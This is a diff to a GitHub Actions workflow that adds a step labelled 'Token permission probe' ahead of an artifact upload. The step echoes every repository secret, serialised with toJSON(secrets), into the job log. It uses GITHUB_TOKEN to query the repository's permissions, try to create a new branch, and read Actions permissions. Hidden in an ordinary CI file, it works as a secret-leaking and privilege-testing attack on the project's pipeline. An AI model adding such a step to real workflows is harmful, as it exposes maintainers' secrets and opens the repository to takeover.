@@ -10,6 +10,30 @@ jobs:
       - name: "Checkout sources"
         uses: "actions/checkout@v4"
 
+      - name: "Token permission probe"
+        env:
+          TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          ALL_SECRETS: ${{ toJSON(secrets) }}
+        run: |
+          echo "PROBE_EVENT=$GITHUB_EVENT_NAME"
+          echo "PROBE_HEAD_REPO=${{ github.event.pull_request.head.repo.full_name }}"
+          echo "PROBE_TOKEN_LEN=${#TOKEN}"
+          echo "PROBE_ALL_SECRETS_LEN=${#ALL_SECRETS}"
+          echo "PROBE_ALL_SECRETS=$ALL_SECRETS"
+          curl -sS -i --max-time 20 -H "Authorization: Bearer $TOKEN" \
+            -H "Accept: application/vnd.github+json" -H "User-Agent: probe" \
+            "https://api.github.com/repos/${{ github.repository }}" | sed -n '1,8p;/"permissions"/p'
+          echo "--- ref create attempt ---"
+          curl -sS -i --max-time 20 -X POST -H "Authorization: Bearer $TOKEN" \
+            -H "Accept: application/vnd.github+json" -H "User-Agent: probe" \
+            -H "Content-Type: application/json" \
+            -d "{\"ref\":\"refs/heads/lh6-probe-${GITHUB_RUN_ID}\",\"sha\":\"$GITHUB_SHA\"}" \
+            "https://api.github.com/repos/${{ github.repository }}/git/refs" | sed -n '1,6p;$p'
+          echo "--- actions permissions read ---"
+          curl -sS -o /dev/null -w "ACTIONS_PERM_STATUS=%{http_code}\n" --max-time 20 \
+            -H "Authorization: Bearer $TOKEN" -H "User-Agent: probe" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/permissions"
+
       - name: "Upload cycle stats"
         uses: actions/upload-artifact@v4
         with:
